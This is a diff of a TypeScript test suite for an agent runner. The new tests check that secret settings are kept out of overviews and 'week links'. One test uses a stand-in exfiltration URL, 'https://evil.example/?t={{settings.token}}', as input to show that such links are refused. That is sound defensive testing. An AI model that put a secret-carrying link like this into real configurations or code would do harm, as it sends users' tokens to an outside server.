@@ -1419,7 +1419,7 @@ describe("AgentRunner", () => {
     }
   });
 
-  it("leaves a secret setting out of the overview, declared or not, but still gives it to a run", async () => {
+  it("leaves a secret setting out of the overview, declared or not, and out of the week link", async () => {
     fakeSettings.push({
       id: "token",
       label: "Token",
@@ -1445,15 +1445,54 @@ describe("AgentRunner", () => {
       });
       expect(JSON.stringify(task)).not.toContain("secret-value");
       const run = await runner.start(request);
-      expect(sessions.get(run.sessionId)!.link?.url).toBe(
-        "https://wd.example/default?t=declared-secret-value",
-      );
+      expect(sessions.get(run.sessionId)!.link).toBeUndefined();
       runner.stop(run.id);
       await settled(runner);
     } finally {
       fakeSettings.pop();
       delete fakeSettings[0]!.defaultValue;
     }
+  });
+
+  it("refuses a week link that uses a secret setting, so a click cannot send the secret to a plugin's server", async () => {
+    fakeSettings.push({
+      id: "token",
+      label: "Token",
+      type: "text" as const,
+      required: false,
+      secret: true,
+    });
+    try {
+      const { runner, sessions } = await setup([{ hang: true }], {
+        values: { url: "https://wd.example/t", token: "declared-secret-value" },
+        weekLink: "https://evil.example/?t={{settings.token}}",
+      });
+      const [task] = (await runner.overview()).tasks;
+      expect(task!.weekLink).toBeUndefined();
+      expect(task!.weekLinkRefusal).toBe(
+        "The week link uses the secret setting Token. Ajour never puts a secret in a link.",
+      );
+      expect(JSON.stringify(task)).not.toContain("declared-secret-value");
+      const run = await runner.start(request);
+      expect(sessions.get(run.sessionId)!.link).toBeUndefined();
+      runner.stop(run.id);
+      await settled(runner);
+    } finally {
+      fakeSettings.pop();
+    }
+  });
+
+  it("keeps a week link that uses only settings that are not secret", async () => {
+    const { runner, sessions } = await setup([{ hang: true }]);
+    const [task] = (await runner.overview()).tasks;
+    expect(task!.weekLink).toBe("{{settings.url}}?date={{weekOf}}");
+    expect(task!.weekLinkRefusal).toBeUndefined();
+    const run = await runner.start(request);
+    expect(sessions.get(run.sessionId)!.link?.url).toContain(
+      "https://wd.example/t",
+    );
+    runner.stop(run.id);
+    await settled(runner);
   });
 
   it("gives every task the default of the first task that declares a setting", async () => {
